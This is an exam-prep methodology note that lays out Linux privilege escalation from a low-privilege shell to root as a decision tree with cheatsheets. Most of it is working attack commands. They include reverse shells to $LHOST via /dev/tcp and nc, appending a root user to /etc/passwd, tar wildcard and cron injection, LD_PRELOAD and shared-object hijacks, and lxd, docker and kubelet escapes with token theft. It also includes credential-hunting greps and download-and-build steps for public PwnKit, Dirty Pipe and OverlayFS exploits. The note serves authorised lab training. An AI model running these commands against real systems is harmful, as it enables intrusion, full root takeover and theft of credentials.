# NOTE — Linux Privilege Escalation Methodology (Exam Playbook)

## ID
713

## Module
Linux Privilege Escalation

## Kind
methodology

## Title
Linux Privilege Escalation — Full Exam Playbook (low-priv shell → root)

## Description
End-to-end exam-ready playbook for going from an unprivileged Linux shell to root: situational-awareness enum → credential hunting → misconfig abuse (SUID/sudo/cron/PATH/caps/groups) → container/service escapes → kernel & service CVEs. Decision-tree first; every command drawn from this module's own notes. Grep this when you have a shell and don't know the next move.

## Tags
methodology, linux-privesc, lpe, exam, cheatsheet, decision-tree, stuck, got-shell, low-priv, suid, sgid, sudo -l, nopasswd, cron, path-abuse, wildcard, restricted-shell, rbash, capabilities, cap_setuid, lxd, docker, docker.sock, kubernetes, kubelet, logrotate, nfs, no_root_squash, tmux, kernel-exploit, overlayfs, ld_preload, shared-object, python-hijack, pythonpath, CVE-2019-14287, CVE-2021-3156, baron-samedit, CVE-2021-4034, pwnkit, polkit, pkexec, CVE-2022-0847, dirty-pipe, netfilter, gtfobins, pspy, root

---

## TL;DR — The 7-Phase Flow

1. **Situational awareness** — `id`, `sudo -l`, OS/kernel, PATH, groups, NICs. Screenshot the first five commands.
2. **Credential hunting** — configs, web roots, SSH keys, history, backups, DBs, mail. Reuse everything.
3. **Quick wins** — `sudo -l` (NOPASSWD/GTFOBins), writable `/etc/passwd`, SUID/SGID, group membership (lxd/docker/disk/adm).
4. **Misconfig abuse** — PATH, wildcard, cron, capabilities, restricted-shell escape, LD_PRELOAD, .so / python hijack.
5. **Container / service escape** — lxd, docker socket, kubelet, NFS no_root_squash, tmux hijack, vulnerable SUID service.
6. **Sudo & polkit CVEs** — version-gated: CVE-2019-14287, Baron Samedit, PwnKit.
7. **Kernel CVEs (LAST resort)** — OverlayFS, Dirty Pipe, netfilter. Noisy, can panic the box.

> **Golden rule:** misconfig before kernel. Run `sudo -l` and the SUID find on *every* shell and *every* user you pivot to — the path is almost always a misconfiguration, not a 0-day. Re-enumerate after every lateral move; the next user has different groups/sudo.

> **OPSEC fork:** kernel/service CVE exploits can crash the box and are forensically loud (logrotten symlinks, ld.so.preload writes, /etc/passwd edits). On a real engagement exhaust sudo/SUID/cron/caps/groups first; only reach for a kernel exploit with evidence the box is unpatched and after confirming a snapshot/rollback exists. See Gotcha #1.

---

## Phase 1 — Situational Awareness

**You have:** an unprivileged shell (often `www-data` from web RCE).
**Goal:** OS/kernel, who you are, what you can already do, where you can pivot.

```bash
# The first five — run on EVERY shell, screenshot for the report
whoami; id; hostname; ip a | grep inet; sudo -l 2>/dev/null

cat /etc/os-release; uname -a            # distro + kernel (note for CVE matching)
echo $PATH                               # writable/'.' entry = Phase 4 PATH abuse
env                                      # leaked creds/tokens; LD_PRELOAD in env_keep?
cat /etc/shells                          # tmux/screen present?
grep "sh$" /etc/passwd                   # users with real login shells = targets
cat /etc/group; getent group sudo        # your group memberships (Phase 3)
ls /home                                 # enumerate every home dir
ip a; route; arp -a; cat /etc/resolv.conf  # extra NIC = pivot; internal DNS = AD
lsblk; cat /etc/fstab; df -h             # unmounted FS, fstab creds
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null   # hidden files
ls -l /tmp /var/tmp /dev/shm             # world-writable scratch space
```

**Output checkpoint:** you know the kernel version, your UID/GID/groups, your `sudo -l` rights, the PATH, extra NICs, and the user list. Hash prefixes: `$1$`=MD5 `$5$`=SHA-256 `$6$`=SHA-512 `$2a$`=BCrypt.
Detail: `[[02_environment_enumeration]]`, `[[03_services_internals_enumeration]]`.

---

## Phase 2 — Credential Hunting

**Trigger:** always (run in parallel with Phase 1). Found creds → `su <user>` and re-run Phase 1 as them.

| Source | Command |
|---|---|
| Web app configs | `grep 'DB_USER\|DB_PASSWORD' $(find / -name "wp-config.php" 2>/dev/null)` |
| Broad config sweep | `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null` |
| SSH keys | `find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null` |
| SSH targets | `cat ~/.ssh/known_hosts` (and every user's `~/.ssh/`) |
| Password grep | `grep -ri "password\|secret\|key\|credential" /etc/ /home/ /var/www/ 2>/dev/null \| grep -v Binary` |
| Backups | `find / -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null` |
| DB files | `find / -name "*.db" -o -name "*.sqlite" -o -name "*.sql" 2>/dev/null` |
| Mail spools | `ls -la /var/mail/ /var/spool/mail/ 2>/dev/null` |
| Bash history | `cat /home/*/.bash_history 2>/dev/null \| grep -i "pass\|secret\|key\|token\|sshpass"` |

**Output checkpoint:** a candidate password/key list. **Spray every password against every user** (`su <user>`) — reuse is the #1 lateral path. Detail: `[[04_credential_hunting]]`.

---

## Phase 3 — Quick Wins (check these FIRST, in order)

| Check | Command | Win condition |
|---|---|---|
| Sudo rights | `sudo -l` | NOPASSWD entry → GTFOBins it; `env_keep+=LD_PRELOAD` → Phase 4 |
| Writable passwd | `ls -l /etc/passwd` | world-writable → add root user (guaranteed win) |
| SUID | `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` | non-standard binary → GTFOBins |
| SGID | `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null` | non-standard binary → GTFOBins |
| Capabilities | `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;` | `cap_setuid`/`cap_dac_override` → Phase 4 |
| Groups | `id` | `lxd`/`docker`/`disk`/`adm` → Phase 5 |
| Sudo version | `sudo -V \| head -1` | <1.8.28 or 1.8.31/1.9.2 → Phase 6 CVE |

Writable `/etc/passwd` instant root:
```bash
openssl passwd -1 -salt x Pass123                    # → $1$x$...
echo 'r00t:$1$x$<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
su r00t                                              # Pass123
```

Sudo GTFOBins examples (from notes):
```bash
sudo /usr/bin/openssl ...                            # GTFOBins openssl → file read / shell
sudo /usr/sbin/tcpdump -ln -i $IFACE -w /dev/null -W 1 -G 1 -z /tmp/.t -Z root
  # /tmp/.t = chmod +x script with: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST 443 >/tmp/f
```
Detail: `[[08-special-permissions]]`, `[[09-sudo-rights-abuse]]`, `[[01-intro]]`.

---

## Phase 4 — Misconfiguration Abuse

### 4.A — PATH Abuse
**Trigger:** writable dir in `$PATH`, or `.` in PATH, or a root script/SUID binary calling a command by relative name (`ls` not `/bin/ls`).
```bash
echo $PATH                                  # spot non-default / writable entry
PATH=.:${PATH}; export PATH
echo '/bin/bash -p' > $RELATIVE_CMD; chmod +x $RELATIVE_CMD   # then trigger the privileged caller
```
Detail: `[[05-path_abuse]]`.

### 4.B — Wildcard Abuse (tar)
**Trigger:** root cron/script runs `tar` with `*` in a directory you can write to.
```bash
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh root.sh"
# wait for cron → sudo su
```
Detail: `[[06-wildcard-abuse]]`.

### 4.C — Cron Job Abuse
**Trigger:** world-writable script run by root cron.
```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null     # writable files
ls -la /etc/cron.* /etc/cron.d/; crontab -l; cat /etc/crontab
./pspy64 -pf -i 1000                                            # see cron run live
echo 'bash -i >& /dev/tcp/$LHOST/443 0>&1' >> $WRITABLE_CRON_SCRIPT   # APPEND, never overwrite
sudo nc -nvlp 443                                               # listener BEFORE cron fires
```
Detail: `[[13-cron-job-abuse]]`.

### 4.D — Capabilities
**Trigger:** `getcap` shows `cap_setuid` or `cap_dac_override` on a binary (esp. a vim/python/perl variant).
```bash
getcap /usr/bin/vim.basic                                       # cap_dac_override+ep
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
su root                                                         # no password now
# cap_setuid python: ./python -c 'import os;os.setuid(0);os.system("/bin/sh")'
```
Detail: `[[11-capabilities]]`.

### 4.E — Restricted Shell Escape
**Trigger:** prompt is rbash/rksh/rzsh (`echo $0`, `echo $SHELL`).
```bash
ssh $USER@$TARGET -t "bash --noprofile"        # then Ctrl+C if it hangs
# in-shell escapes (if binary allowed): vi → :set shell=/bin/bash :shell
# awk 'BEGIN{system("/bin/sh")}'  |  find / -exec /bin/bash \;  |  python -c 'import os;os.system("/bin/sh")'
```
Detail: `[[07-scaping-restricted-shells]]`.

### 4.F — LD_PRELOAD Injection
**Trigger:** `sudo -l` shows `env_keep+=LD_PRELOAD` (any NOPASSWD command then works).
```c
// /tmp/root.c
#include <stdlib.h>
void _init(){ unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }
```
```bash
gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so $ANY_SUDO_ALLOWED_BINARY        # → root bash
```
Detail: `[[20-shared-libraries-ld-preload]]`.

### 4.G — Shared Object Hijacking
**Trigger:** SUID binary with custom RUNPATH to a writable dir, or a missing `.so`.
```bash
readelf -d $SUID_BIN | grep PATH        # RUNPATH → writable dir?
ldd $SUID_BIN                           # which lib is loaded from there
# implement the EXACT undefined symbol the binary needs:
# void dbquery(){ setuid(0); system("/bin/sh -p"); }
gcc /tmp/src.c -fPIC -shared -o $RUNPATH/lib<name>.so
$SUID_BIN
```
Detail: `[[21-shared-object-hijacking]]`.

### 4.H — Python Library Hijacking
**Trigger:** SUID or sudo-allowed python script importing a module you can influence.
```bash
# M1 writable module file: inject `import os;os.system("/bin/bash")` into the imported function
# M2 higher-priority sys.path dir writable:  python3 -c 'import sys;print("\n".join(sys.path))'
echo -e 'import os\ndef virtual_memory():\n os.system("/bin/bash")' > $HIGHPRIO/psutil.py
sudo /usr/bin/python3 $SCRIPT
# M3 sudo has SETENV:  sudo PYTHONPATH=/tmp/ /usr/bin/python3 $SCRIPT   (with /tmp/psutil.py)
```
Detail: `[[22-python-library-hijacking]]`.

---

## Phase 5 — Container / Service Escapes

### 5.A — LXD group
**Trigger:** `id` shows `lxd`.
```bash
lxc image import alpine.tar.gz --alias alpine          # transfer alpine builder if needed
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t host disk source=/ path=/mnt/root recursive=true
lxc start r00t; lxc exec r00t /bin/sh
cat /mnt/root/root/root.txt                            # host fs mounted in container
```
Detail: `[[14-lxd]]`, `[[10-privileged-groups]]`.

### 5.B — Docker group / writable docker.sock
**Trigger:** `id` shows `docker`, or `ls -al /var/run/docker.sock` is writable.
```bash
docker run -v /:/mnt --rm -it $LOCAL_IMAGE chroot /mnt bash      # docker group
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it $IMG chroot /mnt bash
```
Detail: `[[15-docker]]`, `[[10-privileged-groups]]`.

### 5.C — disk / adm groups
```bash
# disk:  debugfs /dev/sda1   → cat /root/.ssh/id_rsa etc.
# adm:   grep -rw "flag\|password" /var/log 2>/dev/null
```
Detail: `[[10-privileged-groups]]`.

### 5.D — Kubernetes (kubelet 10250 anon)
**Trigger:** node port 10250 reachable & anonymous.
```bash
kubeletctl -i --server $NODE pods
kubeletctl -i --server $NODE scan rce
kubeletctl -i --server $NODE exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p $POD -c $CON | tee k8.token
kubeletctl --server $NODE exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p $POD -c $CON | tee ca.crt
export token=$(cat k8.token)
kubectl --token=$token --certificate-authority=ca.crt --server=https://$NODE:6443 auth can-i --list
kubectl --token=$token --certificate-authority=ca.crt --server=https://$NODE:6443 apply -f privesc.yaml   # hostPath / mount
kubeletctl --server $NODE exec "cat /root/etc/shadow" -p privesc -c privesc
```
Detail: `[[16-kubernetes]]`.

### 5.E — NFS no_root_squash
**Trigger:** `showmount -e $TARGET` shows an export with `no_root_squash`.
```bash
# attacker box (root):
sudo mount -t nfs $TARGET:/share /mnt
gcc shell.c -o /mnt/shell      # shell.c: setuid(0);setgid(0);system("/bin/bash")
chmod u+s /mnt/shell
# on target as low-priv user:
/share/shell -p
```
Detail: `[[18-miscellaneous-techniques]]`.

### 5.F — Tmux session hijack
**Trigger:** root tmux with a group-readable socket and you're in that group.
```bash
ps aux | grep tmux; ls -la $SOCKET
tmux -S $SOCKET                  # attach → root shell
```
Detail: `[[18-miscellaneous-techniques]]`.

### 5.G — Vulnerable SUID service
**Trigger:** outdated SUID service (e.g. GNU Screen 4.5.0).
```bash
screen -v; searchsploit "GNU Screen 4.5.0"
searchsploit -m linux/local/41154.sh
chmod +x 41154.sh; ./41154.sh           # ld.so.preload hijack → root
```
Detail: `[[12-vulnerable-services]]`.

---

## Phase 6 — Sudo & Polkit CVEs (version-gated)

| CVE | Precondition | Trigger |
|---|---|---|
| **CVE-2019-14287** | sudo <1.8.28 **and** sudoers `(ALL, !root)` entry | `sudo -u#-1 $ALLOWED_BIN` then escape pager (`b`/`!/bin/bash`) |
| **CVE-2021-3156** (Baron Samedit) | sudo 1.8.31 / 1.8.27 / 1.9.2 (heap), `gcc`+`make` on target | `git clone blasty/CVE-2021-3156 && make && ./sudo-hax-me-a-sandwich $ID` |
| **CVE-2021-4034** (PwnKit) | any unpatched polkit pre-Jan-2022, `gcc` on target | `git clone arthepsy/CVE-2021-4034 && gcc cve-2021-4034-poc.c -o poc && ./poc` |

PwnKit needs **no sudo/PAM config** — if the box is old, this is the highest-EV CVE. Drops to `sh`.
Detail: `[[23-sudo]]`, `[[24-polkit]]`.

---

## Phase 7 — Kernel CVEs (LAST resort — can panic the box)

```bash
uname -r; cat /etc/lsb-release
```

| CVE | Kernel range | Build/run |
|---|---|---|
| **CVE-2021-3493** (OverlayFS) | Ubuntu 5.x unpatched | `gcc ofs_exploit.c -o ofs_exploit && ./ofs_exploit` (reliable — prefer this) |
| **CVE-2022-0847** (Dirty Pipe) | 5.8 – 5.17 | `bash compile.sh` → `./exploit-1` (passwd) or `./exploit-2 $SUID_BIN` |
| **CVE-2021-22555** (netfilter) | 2.6 – 5.11 | `gcc -m32 -static exploit.c -o e && ./e` |
| **CVE-2022-25636** (netfilter) | 5.4 – 5.6.10 | `git clone Bonfee/CVE-2022-25636 && make && ./exploit` (crash-prone) |
| **CVE-2023-32233** (netfilter) | ≤ 6.3.1 | `gcc -Wall -o e exploit.c -lmnl -lnftnl && ./e` |

Detail: `[[19-kernel-exploits]]`, `[[25-dirty-pipe]]`, `[[26-netfilter]]`.

---

## Decision Tree (Under Exam Pressure)

```
You have a low-priv shell:
│
├── FIRST: id; sudo -l; uname -a; getcap; SUID find  (always, every user)
│
├── sudo -l shows something
│   ├── NOPASSWD binary → GTFOBins it (openssl/tcpdump/vi/less/busctl...)
│   ├── env_keep+=LD_PRELOAD → 4.F (malicious .so)
│   ├── SETENV + python script → 4.H M3 (PYTHONPATH)
│   └── (ALL,!root) + sudo<1.8.28 → CVE-2019-14287
│
├── in a group
│   ├── lxd → 5.A   docker → 5.B   disk → debugfs   adm → grep /var/log
│
├── SUID/SGID non-standard binary → GTFOBins (or shared-object hijack 4.G)
│
├── getcap shows cap_setuid/cap_dac_override → 4.D
│
├── writable /etc/passwd → add root line → su (instant win)
│
├── writable script run by root (cron/service)
│   ├── plain script → append reverse shell 4.C (pspy to confirm)
│   ├── tar with * → wildcard 4.B
│   └── relative cmd / writable PATH dir → PATH abuse 4.A
│
├── restricted shell (rbash) → 4.E escape first, then re-run this tree
│
├── creds found anywhere → su to that user → RE-RUN this whole tree as them
│
├── nothing misconfigured, box looks OLD
│   ├── polkit unpatched → PwnKit CVE-2021-4034 (no prereqs, highest EV)
│   ├── sudo 1.8.31/1.9.2 → Baron Samedit CVE-2021-3156
│   └── kernel in a vuln range → OverlayFS / DirtyPipe / netfilter (Phase 7)
│
└── STUCK > 20 min
    ├── run linpeas/pspy if not yet; diff SUID list vs a clean baseline
    ├── re-read /home/*/.bash_history & all *config* (you missed a cred)
    ├── grep ../ATTACK-PATHS.md for your exact symptom
    └── pivot user via any found password and start the tree over
```

---

## Signal → Counter-Move Reference

| You see / observe | Likely cause | Counter-move |
|---|---|---|
| `sudo -l` → `(ALL : ALL) NOPASSWD: /usr/bin/X` | GTFOBins candidate | Look X up on GTFOBins → sudo section |
| `sudo -l` → `env_keep+=LD_PRELOAD` | LD_PRELOAD injection open | 4.F malicious `.so`, run via any allowed sudo cmd |
| `sudo -l` → `(ALL, !root) ...` | CVE-2019-14287 if sudo<1.8.28 | `sudo -u#-1 <bin>` |
| Reverse shell from cron never connects | Listener started after cron fired, or `>` overwrote script | Start `nc` FIRST; use `>>` to append; use port 443 |
| `tar` cron with `*`; you can write the dir | Wildcard injection | `touch -- "--checkpoint-action=exec=sh root.sh"` |
| `getcap` → `cap_setuid+ep` / `cap_dac_override+ep` | Capability privesc | 4.D (python setuid(0) / vim edit passwd) |
| Prompt rejects `cd`, `/`, `;` | Restricted shell (rbash) | `ssh user@h -t "bash --noprofile"`; Ctrl+C if hung |
| `id` shows `lxd`/`docker`/`disk`/`adm` | Group-based escape | Phase 5 (lxd container / docker -v / debugfs / grep logs) |
| SUID binary, GTFOBins shows no entry | Custom binary | `readelf -d` for RUNPATH → shared-object hijack 4.G |
| python script via sudo, `sys.path[0]` writable | Library hijack | 4.H drop fake module earlier in path |
| Reverse shell has no TTY (Ctrl-C kills it, `sudo` fails) | Dumb shell | `python3 -c 'import pty;pty.spawn("/bin/bash")'` then continue |
| Garbled pager echo `!//bbiinn` after escape | Cosmetic double-echo, no PTY | Command still ran — ignore the visual |
| `pkexec --version` old, box pre-2022 | PwnKit | CVE-2021-4034 (no prereqs) |
| `sudo -V` → 1.8.31 / 1.9.2 | Baron Samedit | CVE-2021-3156 (needs gcc+make) |
| Kernel 5.8–5.17 | Dirty Pipe | CVE-2022-0847 `./exploit-1` |
| `showmount -e` → `no_root_squash` | NFS root squash off | Plant SUID binary via NFS mount |
| `find -perm -4000` differs from clean box | Planted/extra SUID | Investigate the delta first |

---

## Master Cheatsheet — One-Liners by Scenario

```bash
# === S1: Cold start situational awareness ===
whoami; id; hostname; ip a|grep inet; sudo -l 2>/dev/null; uname -a; echo $PATH
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null

# === S2: Credential sweep ===
grep -ri "password\|secret\|api_key" /etc/ /home/ /var/www/ 2>/dev/null | grep -v Binary
find / -name "id_rsa" -o -name "*.bak" -o -name "wp-config.php" 2>/dev/null
cat /home/*/.bash_history 2>/dev/null | grep -i "pass\|sshpass\|mysql -p"

# === S3: Writable /etc/passwd → instant root ===
echo "r00t:$(openssl passwd -1 Pass123):0:0::/root:/bin/bash" >> /etc/passwd && su r00t

# === S4: LD_PRELOAD (env_keep+=LD_PRELOAD) ===
echo 'void _init(){unsetenv("LD_PRELOAD");setuid(0);system("/bin/bash");}' > /tmp/r.c
gcc -fPIC -shared -o /tmp/r.so /tmp/r.c -nostartfiles
sudo LD_PRELOAD=/tmp/r.so $ANY_SUDO_BIN

# === S5: Writable root cron script ===
sudo nc -nvlp 443 &                              # listener FIRST
echo 'bash -i >& /dev/tcp/$LHOST/443 0>&1' >> $WRITABLE_CRON_SCRIPT
./pspy64 -pf -i 1000                             # confirm it fires

# === S6: tar wildcard cron ===
echo 'cp /bin/bash /tmp/b; chmod +xs /tmp/b' > shell.sh
touch -- "--checkpoint=1"; touch -- "--checkpoint-action=exec=sh shell.sh"
# after cron: /tmp/b -p

# === S7: capability cap_dac_override on vim ===
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd; su root

# === S8: lxd group ===
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t d disk source=/ path=/mnt/root recursive=true
lxc start r00t; lxc exec r00t /bin/sh

# === S9: docker group ===
docker run -v /:/mnt --rm -it $IMG chroot /mnt bash

# === S10: PwnKit (old box, no prereqs) ===
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034 && gcc cve-2021-4034-poc.c -o poc && ./poc

# === S11: Dirty Pipe (kernel 5.8–5.17) ===
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits && bash compile.sh && ./exploit-1

# === S12: OverlayFS (Ubuntu, reliable) ===
wget https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c -O o.c
gcc o.c -o o && ./o

# === S13: dumb shell upgrade (do this before sudo/pager escapes) ===
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then: export TERM=xterm; Ctrl+Z; stty raw -echo; fg; (enter)
```

---

## Quick Reference — Tools by Function

| Function | Tool / Command |
|---|---|
| Auto-enum | `linpeas.sh`, `LinEnum.sh`, `lynis audit system` |
| Live process/cron watch | `pspy64 -pf -i 1000` |
| SUID / SGID | `find / -perm -4000`, `-perm -6000` |
| Capabilities | `getcap -r / 2>/dev/null` |
| Sudo rights | `sudo -l`, `sudo -V` |
| GTFOBins lookup | gtfobins.github.io (sudo/SUID/capabilities/limited-SUID) |
| Exploit search | `searchsploit "<service> <version>"`, `searchsploit -m <id>` |
| Shell upgrade | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |
| Reverse shell | `bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1`; `nc -nvlp $LPORT` |
| Container escape | `lxc`, `docker`, `kubeletctl`, `kubectl` |
| Cred grep | `grep -ri password`, `find -name wp-config.php / id_rsa / *.bak` |
| Lateral | `su <user>`, `ssh -i key user@host`, `sshpass -p` |
| NFS | `showmount -e`, `mount -t nfs` |

GTFOBins is the single highest-value external lookup — almost every SUID/sudo win routes through it.

---

## Top Gotchas (Things That Will Burn You)

1. **Misconfig before kernel.** Kernel exploits are the *last* resort: noisy, crash-prone, often fail. The exam path is nearly always sudo/SUID/cron/cap/group. Don't burn 40 min compiling a netfilter PoC before running `sudo -l`.
2. **Dumb shell kills Phase 6 and pager escapes.** A WAR/web reverse shell has no TTY — `sudo` and `vi`/`busctl` pager escapes fail. **Always** upgrade first: `python3 -c 'import pty;pty.spawn("/bin/bash")'`. This is the #1 Skills-Assessment foot-gun.
3. **Cron: APPEND, never overwrite.** `>>` not `>`. Overwriting the script breaks the legit job and often the privesc. And start the listener BEFORE the cron fires.
4. **Re-enumerate after every pivot.** New user = different `id`, `sudo -l`, group membership, readable files. Run the whole tree again as them. Creds reuse aggressively (`su` every password everywhere).
5. **`ls` ≠ `ls -lA`.** Hidden dotfiles (and dotfiles inside dotdirs) hide flags/creds. Skills-Assessment Flag 1 is a `.flag` inside `.config`.
6. **Tomcat/app creds live in `.bak`/`.old` files**, not the live config — grep backups, not just the running file.
7. **`/bin/sh -p` (or `bash -p`) preserves SUID.** Plain `/bin/bash` from a SUID context drops privileges — use `-p`.
8. **Garbled pager output is cosmetic.** `!//bbiinn//bbaasshh` after a pager escape on a no-PTY shell still executes — don't assume failure and retry into a mess.
9. **LD_PRELOAD `.so` needs `unsetenv("LD_PRELOAD")` + `-nostartfiles`.** Without unsetenv it recurses; without `-nostartfiles` it won't load via `_init`.
10. **Shared-object hijack: implement the EXACT missing symbol name.** `ldd`/run the binary to learn the undefined function; RUNPATH ≠ RPATH (check with `readelf -d`).
11. **CVE-2019-14287 needs the `(ALL, !root)` sudoers form** — not generic NOPASSWD. Verify the rule before trying `-u#-1`.
12. **Baron Samedit / kernel PoCs need `gcc`/`make` on target.** No compiler → cross-compile on attacker box and transfer, or pick PwnKit (smaller) / a precompiled build.
13. **Quote globs in `find`.** `find / -name "*.sh"` — unquoted silently fails if matching files exist in CWD.
14. **`net-tools` may be absent.** Use `ip a` / `ss` instead of `ifconfig` / `netstat`.
15. **GTFOBins one-liner needs internet.** On isolated targets, pre-download the package list / consult GTFOBins from the attack box.
16. **Wildcard injection: `touch --` to create flag-named files** so the shell doesn't interpret `--checkpoint-action` as an option to `touch`.
17. **Kernel-range overlap.** A 5.8 kernel matches Dirty Pipe *and* netfilter — try the most reliable (Dirty Pipe / OverlayFS) before crash-prone netfilter.
18. **Document the chain.** Exam grades the path: record `user:pass@host (source)` and every escalation step as you go.

---

## Related Vault Notes

- `[[01-intro]]` — methodology mindset, enum-first
- `[[02_environment_enumeration]]` — OS/kernel/users/network baseline
- `[[03_services_internals_enumeration]]` — services, cron, packages, /proc, history
- `[[04_credential_hunting]]` — configs, keys, backups, mail, DBs
- `[[05_path_abuse]]` — PATH hijack
- `[[06-wildcard-abuse]]` — tar `--checkpoint`
- `[[07-scaping-restricted-shells]]` — rbash escape
- `[[08-special-permissions]]` — SUID/SGID + GTFOBins
- `[[09-sudo-rights-abuse]]` — NOPASSWD, tcpdump/openssl
- `[[10-privileged-groups]]` — lxd/docker/disk/adm
- `[[11-capabilities]]` — cap_setuid / cap_dac_override
- `[[12-vulnerable-services]]` — outdated SUID service (Screen)
- `[[13-cron-job-abuse]]` — writable cron script + pspy
- `[[14-lxd]]` — privileged container escape
- `[[15-docker]]` — docker group / docker.sock
- `[[16-kubernetes]]` — kubelet anon → token → pod
- `[[17-lograte]]` — logrotten race
- `[[18-miscellaneous-techniques]]` — NFS no_root_squash, tmux hijack, traffic capture
- `[[19-kernel-exploits]]` — OverlayFS CVE-2021-3493
- `[[20-shared-libraries-ld-preload]]` — LD_PRELOAD `.so`
- `[[21-shared-object-hijacking]]` — RUNPATH hijack
- `[[22-python-library-hijacking]]` — module / PYTHONPATH hijack
- `[[23-sudo]]` — CVE-2019-14287, Baron Samedit CVE-2021-3156
- `[[24-polkit]]` — PwnKit CVE-2021-4034
- `[[25-dirty-pipe]]` — CVE-2022-0847
- `[[26-netfilter]]` — CVE-2021-22555 / 2022-25636 / 2023-32233
- `[[27-linux-hardening]]` — defender view (report remediation)
- `[[28-skills-assessment]]` — full chain: hidden file → bash_history → adm → Tomcat WAR → sudo busctl

External cross-vault:
- Chains from web RCE: `[[../attacking-common-applications/00-METHODOLOGY]]` (Tomcat WAR → shell feeds Phase 1 here)
- Post-root pivoting: `[[../pivoting-tunneling/00-METHODOLOGY]]`
- AD-joined Linux host: `[[../ad-enum-attacks/00-METHODOLOGY]]` (internal DNS in `/etc/resolv.conf` → treat as AD)
- Triage by symptom: `[[../ATTACK-PATHS]]`
- Index: `[[../SEARCH]]`
